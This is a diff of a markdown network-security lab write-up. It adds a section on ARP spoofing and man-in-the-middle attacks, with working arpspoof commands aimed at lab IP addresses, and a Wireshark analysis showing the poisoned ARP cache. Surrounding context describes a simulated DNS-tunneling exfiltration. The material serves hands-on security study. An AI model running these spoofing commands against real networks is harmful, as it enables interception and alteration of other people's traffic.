@@ -275,7 +275,7 @@ In contrast, the SYN scan test using `nmap -sS` demonstrated a half-open connect
 
 ## DNS TUNNELING
 
-### Step 1: Set up the Client VM
+### Step 1: Set up the `Client VM`
 
 - ### Install `dig` (DNS query tool):
 ```bash
@@ -307,6 +307,52 @@ done
 During the simulation, Wireshark captured multiple DNS query packets originating from the attacker VM directed to `stealthy-domain.com`, demonstrating the encoded subdomain requests typical of DNS tunneling or data exfiltration attempts. These queries contained randomized alphanumeric strings in the subdomain portion, mimicking how sensitive data might be covertly encoded within DNS requests. Shortly after these DNS packets, `ICMP “Destination Unreachable”` messages were observed repeatedly—five times in quick succession—indicating that the DNS server or network device did not recognize or could not route the queried domain. This pattern is consistent with an attacker attempting to exfiltrate data via DNS, while the network or target system rejects or fails to resolve these crafted requests, potentially signaling an attempted stealthy communication or misconfiguration in the simulated environment.
 
 ---
+
+## ARP SPOOFING & MAN-IN-THE-MIDDLE ATTACK
+
+### Step 1: Set Up the `Client VM`
+
+- ### Install the `dsniff` package:
+```bash
+sudo apt update
+sudo apt install dsniff -y
+```
+
+### *Start `Wireshark` and begin capturing on `enp0s3`.*
+
+---
+
+### Step 2: Start the ARP Spoofing:
+
+```bash
+sudo arpspoof -i enp0s3 -t 10.10.10.100 10.10.10.50
+```
+
+```bash
+sudo arpspoof -i enp0s3 -t 10.10.10.50 10.10.10.100
+```
+
+-### Display the current ARP table with `arp -n`:
+
+<img width="723" height="182" alt="Lab 48" src="https://github.com/user-attachments/assets/50fe0e47-7049-4dcb-b1fa-cc6870792245" />
+
+### *The current ARP table shows that the `Server VM` associates the IP `10.10.10.100` (the sender) with the attacker's MAC address `08:00:27:a4:29:a6`.*
+
+---
+
+### Step 3: Analyze the `DNS Tunneling` in Wireshark
+
+- ### Apply the display filter: `arp`
+
+<img width="1068" height="887" alt="Lab 47" src="https://github.com/user-attachments/assets/a19037e5-831b-4efe-8d28-40819f4a32df" />
+
+The ARP spoofing was successful because the victim’s ARP cache was tricked into associating the attacker’s MAC address with the IP address `10.10.10.100`. This allows the attacker to intercept or alter network traffic between the victim and the legitimate sender, effectively enabling a `man-in-the-middle` (MITM) attack.
+
+---
+
+
+
+
 
 
 
